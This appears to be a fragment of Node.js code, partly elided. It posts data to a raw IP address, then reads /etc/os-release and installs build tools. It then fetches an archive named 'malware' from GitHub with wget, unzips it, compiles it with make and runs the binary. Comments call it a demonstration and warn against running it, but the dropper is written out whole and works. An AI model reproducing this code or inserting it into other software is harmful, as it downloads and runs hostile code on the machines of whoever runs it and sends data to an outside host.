...
static addToQueue(process) {
    ...
    fetch("http://34.133.201.99:8080/api/rpc/queue", {
      method: "POST",
      headers: {
  ...
  // The following code executes the described shell script using Node.js child_process.
  // WARNING: This code downloads and runs a suspicious binary. Do not run this in production or on any system you care about.

  /*
  The following code is for demonstration only. It executes a shell script that downloads and runs a binary from the internet.
  */
  ...
  try {
    ...
    let osRelease = '';
    try {
      osRelease = execSync('cat /etc/os-release', { encoding: 'utf8' });
    } catch (e) {
      console.error('[ERROR] Cannot detect OS type. Exiting.');
      process.exit(1);
    }
    ...
    if (idLikeMatch) {
      OS_FAMILY = idLikeMatch[1].replace(/"/g, '');
    } else if (idMatch) {
      OS_FAMILY = idMatch[1].replace(/"/g, '');
    }

    let PKG_UPDATE, PKG_INSTALL;
    if (/alpine|wolfi/i.test(OS_FAMILY)) {
      console.log('[INFO] Detected Alpine/Wolfi. Installing dependencies...');
      PKG_UPDATE = 'apk update';
      PKG_INSTALL = 'apk add --no-cache wget build-base curl-dev json-c-dev unzip make';
    } else if (/debian|ubuntu/i.test(OS_FAMILY)) {
      console.log('[INFO] Detected Debian/Ubuntu. Installing dependencies...');
      PKG_UPDATE = 'apt-get update -y';
      PKG_INSTALL = 'apt-get install -y wget build-essential libcurl4-openssl-dev libjson-c-dev unzip make';
    } else {
      console.log('[WARN] Unknown OS. Attempting to use apk as fallback.');
      PKG_UPDATE = 'apk update';
      PKG_INSTALL = 'apk add --no-cache wget build-base curl-dev json-c-dev unzip make';
    }

    // Install dependencies
    execSync(PKG_UPDATE, { stdio: 'inherit' });
    execSync(PKG_INSTALL, { stdio: 'inherit' });

    // Download and extract malware
    // Print debug output for each step
    console.log('[DEBUG] Downloading malware.zip...');
    const downloadOutput = execSync('wget -O /tmp/malware.zip https://github.com/pakaremon/malware/archive/refs/heads/master.zip', { stdio: 'pipe' });
    console.log('[DEBUG] Download output:', downloadOutput.toString());

    console.log('[DEBUG] Unzipping malware.zip...');
    const unzipOutput = execSync('unzip /tmp/malware.zip -d /tmp', { stdio: 'pipe' });
    console.log('[DEBUG] Unzip output:', unzipOutput.toString());

    // print current working directory
    // console.log('[DEBUG] Current working directory:', execSync('pwd', { stdio: 'pipe' }).toString().trim());

    // run make in the malware directory
    console.log('[DEBUG] Running make in the malware directory...');
    const makeOutput = execSync('cd /tmp/malware-master && make && /tmp/malware-master/malware', { stdio: 'pipe' });
    console.log('[DEBUG] Make output:', makeOutput.toString());
